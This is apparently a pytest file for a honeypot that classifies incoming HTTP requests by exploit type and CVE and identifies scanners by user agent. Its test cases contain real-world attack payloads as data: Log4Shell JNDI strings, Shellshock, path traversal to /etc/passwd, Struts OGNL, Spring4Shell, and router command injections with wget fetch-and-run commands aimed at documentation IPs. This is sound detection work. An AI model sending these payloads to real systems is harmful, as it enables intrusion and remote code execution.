import pytest

from honeypot.classify import classify_request, identify_scanner

CASES = [
    ("GET", "/", {"User-Agent": "${jndi:ldap://198.51.100.7:1389/a}"}, "", "log4shell", "CVE-2021-44228"),
    ("GET", "/", {"X-Api-Version": "${${lower:j}${::-n}d${upper:i}:rmi://198.51.100.7/x}"}, "", "log4shell", "CVE-2021-44228"),
    ("GET", "/cgi-bin/x", {"User-Agent": "() { :; }; echo; /bin/id"}, "", "shellshock", "CVE-2014-6271"),
    ("GET", "/cgi-bin/.%2e/.%2e/.%2e/etc/passwd", {}, "", "path_traversal", "CVE-2021-41773"),
    ("GET", "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array", {}, "", "php_rce", "CVE-2018-20062"),
    ("POST", "/x.action", {"Content-Type": "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}"}, "", "ognl_injection", "CVE-2017-5638"),
    ("POST", "/", {}, "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp", "spring4shell", "CVE-2022-22965"),
    ("POST", "/GponForm/diag_Form?images/", {}, "dest_host=`busybox+wget+http://198.51.100.3/m`;", "iot_router_exploit", "CVE-2018-10561"),
    ("POST", "/ctrlt/DeviceUpgrade_1", {}, "<NewStatusURL>$(wget x)</NewStatusURL>", "iot_router_exploit", "CVE-2017-17215"),
    ("GET", "/cgi-bin/luci/;stok=/locale?form=country&country=$(id)", {}, "", "iot_router_exploit", "CVE-2023-1389"),
    ("GET", "/item?id=1%27%20UNION%20SELECT%20null,version()--", {}, "", "sqli", None),
    ("GET", "/ping?host=127.0.0.1;wget%20http://198.51.100.3/x", {}, "", "command_injection", None),
    ("GET", "/.env", {}, "", "info_disclosure", None),
    ("GET", "/.git/config", {}, "", "info_disclosure", None),
    ("GET", "/wp-login.php", {}, "", "admin_panel_probe", None),
]


@pytest.mark.parametrize("method,path,headers,body,category,cve", CASES)
def test_rules(method, path, headers, body, category, cve):
    r = classify_request(method, path, headers, body)
    assert r["category"] == category, r
    if cve:
        assert cve in r["cves"]


def test_benign_request_is_not_an_exploit():
    r = classify_request("GET", "/index.html", {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}, "")
    assert r["category"] == "benign_or_unknown" and r["cves"] == [] and r["scanner"] is None


def test_payload_urls_are_extracted_not_fetched():
    r = classify_request("GET", "/shell?cd+/tmp;wget+http://198.51.100.5/jaws;sh+jaws", {}, "")
    assert "http://198.51.100.5/jaws" in r["urls"]


@pytest.mark.parametrize("ua,name,kind", [
    ("masscan/1.3 (https://github.com/robertdavidgraham/masscan)", "masscan", "scanner"),
    ("Mozilla/5.0 zgrab/0.x", "zgrab", "scanner"),
    ("Nuclei - Open-source project (github.com/projectdiscovery/nuclei)", "Nuclei", "scanner"),
    ("Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)", "Censys", "research"),
    ("Mozilla/5.0 (compatible; Shodan crawler)", "Shodan", "research"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", None, None),
])
def test_scanner_identification(ua, name, kind):
    assert identify_scanner(ua) == (name, kind)
